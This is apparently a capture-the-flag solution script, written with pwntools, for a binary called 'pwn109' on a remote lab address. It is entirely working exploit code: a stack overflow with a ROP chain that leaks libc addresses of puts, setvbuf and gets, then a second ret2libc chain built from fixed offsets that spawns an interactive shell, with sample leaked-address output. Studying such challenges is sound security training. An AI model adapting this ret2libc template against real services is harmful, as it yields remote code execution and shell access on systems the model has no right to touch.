from pwn import *

context(arch="amd64", os="linux", endian="little")
elf = ELF("./pwn109")
rop = ROP(elf)
libc = elf.libc

r = remote("10.10.140.206", 9009)

#r = process("./pwn109")

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

puts_got = elf.got["puts"]
setvbuf_got = elf.got["setvbuf"]
gets_got = elf.got["gets"]
puts_plt = elf.plt["puts"]

payload  = b"A" * 0x28
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(pop_rdi) + p64(setvbuf_got) + p64(puts_plt)
payload += p64(pop_rdi) + p64(gets_got) + p64(puts_plt)
payload += p64(elf.sym["main"])

r.recvuntil(b"ahead")
r.recv()
r.sendline(payload)

leak_puts    = u64(r.recvline().strip().ljust(8, b"\x00"))
leak_setvbuf = u64(r.recvline().strip().ljust(8, b"\x00"))
leak_gets    = u64(r.recvline().strip().ljust(8, b"\x00"))

log.success(f"Leaked Puts Address: 0x{leak_puts:x}")
log.success(f"Leaked Setvbuf Address: 0x{leak_setvbuf:x}")
log.success(f"Leaked Gets Address: 0x{leak_gets:x}")

"""
[+] Leaked Puts Address:    0x7f17b32a8aa0
[+] Leaked Setvbuf Address: 0x7f17b32a93d0
[+] Leaked Gets Address:    0x7f17b32a8190
"""

payload =  b"A" * 0x28
payload += p64(pop_rdi)
payload += p64(leak_puts + 0x13337a)
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(leak_puts - 0x31550)

r.sendline(payload)

r.interactive()








